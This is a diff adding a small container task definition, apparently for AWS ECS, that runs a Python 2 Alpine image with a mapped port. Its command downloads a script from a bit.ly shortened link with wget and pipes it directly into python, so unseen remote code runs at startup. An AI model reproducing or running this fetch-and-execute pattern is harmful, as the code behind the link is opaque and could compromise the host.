@@ -1,0 +1,17 @@
+[
+  {
+    "name": "${name}",
+    "image": "python:2-alpine",
+    "cpu": 10,
+    "memory": 512,
+    "essential": true,
+    "command": [
+      "/bin/sh", "-c",
+      "wget https://bit.ly/2MJPCKB -O -  | python - ${port}" ],
+    "workingDirectory": "/tmp",
+    "portMappings": [{
+      "containerPort": ${port},
+      "hostPort": ${port}
+    }]
+  }
+]
